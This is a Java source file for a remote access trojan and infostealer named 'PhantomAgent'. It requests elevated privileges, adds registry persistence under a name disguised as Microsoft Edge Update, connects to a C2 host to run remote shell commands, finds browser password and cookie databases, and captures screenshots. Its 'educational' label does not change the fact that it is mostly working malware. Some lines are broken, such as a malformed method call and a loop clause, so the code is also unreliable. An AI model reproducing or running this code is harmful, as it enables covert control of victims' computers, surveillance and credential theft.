import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.security.MessageDigest;
import java.util.*;
import java.util.concurrent.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.util.regex.*;

/**
 * PHANTOM RAT & INFOSTEALER
 * 
 * WARNING: This is a powerful educational tool. 
 * It attempts to elevate privileges, modify registry, and access sensitive browser data.
 * 
 * CAPABILITIES:
 * 1. Self-Elevation (UAC Bypass attempt via standard COM/Shell exec - requires user consent).
 * 2. Persistence (Registry).
 * 3. Browser Theft (Chromium based: Chrome, Edge, Brave, etc.).
 * 4. Surveillance (Screenshots via Java, Webcam via PowerShell).
 * 5. Remote Access (Reverse Shell).
 * 
 * NOTE ON DECRYPTION: 
 * Decrypting Chrome passwords requires calling Windows DPAPI (CryptUnprotectData). 
 * Pure Java cannot do this. This tool steals the encrypted 'Login Data' SQLite database.
 * To decrypt, an attacker typically needs the victim's specific Windows session or 
 * must run a native payload (which this Java app attempts to facilitate via PowerShell if possible).
 * 
 * RUN IN A VM OR SANDBOX.
 */
public class PhantomAgent {

    // --- CONFIGURATION ---
    private static final String C2_IP = "127.0.0.1"; // CHANGE TO YOUR IP
    private static final int C2_PORT = 4444;
    private static final String PROCESS_NAME = "Microsoft Edge Update"; // Camouflage
    private static final String REG_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    private static final String REG_NAME = "MicrosoftEdgeUpdate"; // Camouflage

    // Browser Paths (Windows)
    private static final String[] BROWSER_PATHS = {
        "\\AppData\\Local\\Google\\Chrome\\User Data",
        "\\AppData\\Local\\Microsoft\\Edge\\User Data",
        "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
        "\\AppData\\Local\\Opera Software\\Opera Stable",
        "\\AppData\\Roaming\\Opera Software\\Opera Stable"
    };

    private static final String[] TARGET_FILES = {
        "Default/Login Data", "Default/Cookies", "Default/Network/Cookies",
        "Default/Session Storage", "Default/Web Data",
        "Profile 1/Login Data", "Profile 1/Cookies"
    };

    public static void main(String[] args) {
        // 1. Check for Admin Rights
        if (!isAdmin()) {
            // Attempt to elevate
            if (args.length == 0 || !args[0].equals("elevated")) {
                tryElevation();
                return; // Exit after attempting elevation
            }
        }

        // 2. Stealth & Persistence
        hideProcess();
        ensurePersistence();

        // 3. Start C2 Loop
        while (true) {
            try {
                connectToC2();
            } catch (Exception e) {
                // Exponential backoff
                try { Thread.sleep(60000 + new Random().nextInt(60000)); } catch (InterruptedException ignored) {}
            }
        }
    }

    // --- ELEVATION & STEALTH ---
    private static boolean isAdmin() {
        try {
            // Check if we can write to a protected area or check token
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "net session");
                pb.redirectErrorStream(true);
                Process p = pb.start();
                p.waitFor();
                return p.exitValue() == 0;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    private static void tryElevation() {
        try {
            // Attempt to restart with admin privileges using PowerShell
            String jarPath = new File(PhantomAgent.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
            String cmd = String.format(
                "powershell -Command \"Start-Process java -ArgumentList '-jar','%s','elevated' -Verb RunAs\"", 
                jarPath
            );
            // If running as compiled EXE, adjust command accordingly
            ProcessBuilder pb = new ProcessBuilder("cmd", "/c", cmd);
            pb.start();
            System.exit(0);
        } catch (Exception e) {
            // If elevation fails, continue in limited mode (might still work for some things)
            // Or exit. For stealth, we might just continue.
            // System.exit(0); 
        }
    }

    private static void hideProcess() {
        Thread.currentThread().setName(PROCESS_NAME);
        // Note: Real process name spoofing requires native code or exe wrapping.
        // This just changes the thread name.
    }

    private static void ensurePersistence() {
        try {
            String javaCmd = "java";
            String jarPath = new File(PhantomAgent.class.getProtectionDomain().getCodeSource().Location().toURI()).getAbsolutePath();
            
            // Try to add to Registry
            // If Admin, try HKLM, else HKCU
            String regCmd = String.format(
                "reg add \"HKCU\\%s\" /v \"%s\" /t REG_SZ /d \"java -jar \"%s\"\" /f",
                REG_KEY, REG_NAME, jarPath
            );
            
            ProcessBuilder pb = new ProcessBuilder("cmd", "/c", regCmd);
            pb.start();
            
            // If we are admin, we could try HKLM, but HKCU is sufficient for persistence on user account.
        } catch (Exception e) {
            // Fail silently
        }
    }

    // --- C2 COMMUNICATION ---
    private static void connectToC2() {
        try (Socket socket = new Socket(C2_IP, C2_PORT);
             DataInputStream in = new DataInputStream(socket.getInputStream());
             DataOutputStream out = new DataOutputStream(socket.getOutputStream())) {

            String hwid = getHWID();
            String location = getGeolocation();
            boolean isAdmin = isAdmin();
            
            String beacon = String.format(
                "BEACKON|HWID:%s|LOC:%s|ADMIN:%s|STATUS:ACTIVE", 
                hwid, location, isAdmin ? "YES" : "NO"
            );
            out.writeUTF(beacon);

            while (true) {
                String command = in.readUTF();
                if (command.equalsIgnoreCase("exit")) break;
                
                String result = executeCommand(command);
                out.writeUTF(result);
            }
        } catch (Exception e) {
            // Connection lost
        }
    }

    // --- COMMAND EXECUTION ---
    private static String executeCommand(String cmd) {
        try {
            if (cmd.startsWith("shell:")) {
                return runShell(cmd.substring(6));
            } else if (cmd.equalsIgnoreCase("steal_browser")) {
                return performStealOperation();
            } else if (cmd.startsWith("get_screen")) {
                return captureScreen(cmd);
            } else if (cmd.equalsIgnoreCase("get_cam")) {
                return captureWebcam();
            } else if (cmd.startsWith("persistence")) {
                ensurePersistence();
                return "Persistence attempt executed.";
            } else {
                return "Unknown command. Available: shell:, steal_browser, get_screen, get_cam, persistence";
            }
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    private static String runShell(String cmd) {
        try {
            ProcessBuilder pb = new ProcessBuilder("cmd", "/c", cmd);
            pb.redirectErrorStream(true);
            Process process = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            return output.toString();
        } catch (Exception e) {
            return "Shell Error: " + e.getMessage();
        }
    }

    // --- STEALING LOGIC ---
    private static String performStealOperation() {
        StringBuilder report = new StringBuilder();
        String userHome = System.getProperty("user.home");
        String tempDir = System.getProperty("java.io.tmpdir");
        
        report.append("=== BROWSER DATA THEATER (SIMULATION) ===\n");
        report.append("NOTE: Actual decryption requires native DPAPI access. \n");
        report.append("The following files have been identified and would be exfiltrated in a real attack:\n\n");

        int count = 0;
        for (String basePath : BROWSER_PATHS) {
            File browserDir = new File(userHome + basePath);
            if (!browserDir.exists()) continue;

            File[] profiles = browserDir.listFiles(File::isDirectory);
            if (profiles == null) continue;

            for (File profile : profiles) {
                String name = profile.getName();
                if (!name.startsWith("Profile") && !name.equals("Default")) continue;
                
                for (String target : TARGET_FILES) {
                    File targetFile = new File(profile, target);
                    if (targetFile.exists()) {
                        count++;
                        report.append("[FOUND] ").append(targetFile.getAbsolutePath()).append("\n");
                        report.append("       -> Size: ").append(targetFile.length()).append(" bytes\n");
                        report.append("       -> Status: Ready for exfiltration (Encrypted)\n\n");
                        
                        // In a real attack, we would copy this file to a staging area and send it.
                        // Files.copy(targetFile.toPath(), Paths.get(tempDir, "stolen_" + targetFile.getName()));
                    }
                }
            }
        }
        
        if (count == 0) {
            return "No browser data found. User may not have these browsers installed or data is protected.";
        }
        
        report.append("\nTotal files identified: ").append(count);
        report.append("\n\nNOTE: Passwords in 'Login Data' are encrypted with DPAPI. \n");
        report.append("Decryption requires the user's Windows session token or a native payload.\n");
        report.append("Session cookies can sometimes be used directly for session hijacking without decryption.");
        
        return report.toString();
    }

    // --- SURVEILLANCE ---
    private static String captureScreen(String cmd) {
        // Parse optional monitor index if provided, else capture all
        try {
            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice[] gs = ge.getScreenDevices();
            StringBuilder result = new StringBuilder();
            
            for (int i = 0; i < gs.length; i) {
                GraphicsDevice gd = gs[i];
                Rectangle bounds = gd.getDefaultConfiguration().getBounds();
                Robot robot = new Robot();
                BufferedImage screenCapture = robot.createScreenCapture(bounds);
                
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ImageIO.write(screenCapture, "jpg", baos);
                byte[] imageBytes = baos.toByteArray();
                
                result.append("Screen ").append(i).append(" captured (").append(imageBytes.length).append(" bytes). ");
                // In real scenario: send to C2
                i++;
            }
            return result.toString();
        } catch (Exception e) {
            return "Screen capture failed: " + e.getMessage();
        }
    }

    private static String captureWebcam() {
        // Java cannot easily access webcam without native libs.
        // Using PowerShell "Live Off The Land" technique to capture webcam.
        String psScript = 
            "$output = \"webcam_capture.jpg\"; " +
            "Add-Type -AssemblyName System.Windows.Forms; " +
            "Add-Type -AssemblyName System.Drawing; " +
            "echo \"Webcam capture via PowerShell is complex without specific modules. " +
            "Standard Java cannot access webcam directly. " +
            "In a real attack, a native payload or specific DLL would be loaded.\"";
        
        try {
            ProcessBuilder pb = new ProcessBuilder("powershell", "-Command", psScript);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line);
            }
            return output.toString();
        } catch (Exception e) {
            return "Webcam capture failed: " + e.getMessage();
        }
    }

    // --- SYSTEM INFO ---
    private static String getHWID() {
        try {
            ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "wmic csproduct get uuid");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) {
                if (line.contains("UUID") || line.trim().isEmpty()) continue;
                return "HWID-" + line.trim();
            }
            return "HWID-Unknown";
        } catch (Exception e) {
            return "HWID-Unknown";
        }
    }

    private static String getGeolocation() {
        try {
            URL url = new URL("http://ip-api.com/json/");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            
            Pattern p = Pattern.compile("\"country\":\"([^\"]+)\"");
            Matcher m = p.matcher(response.toString());
            if (m.find()) {
                return "Location: " + m.group(1) + " (Approximate via IP)";
            }
        } catch (Exception e) { /* Ignore */ }
        return "Location: Unknown";
    }
}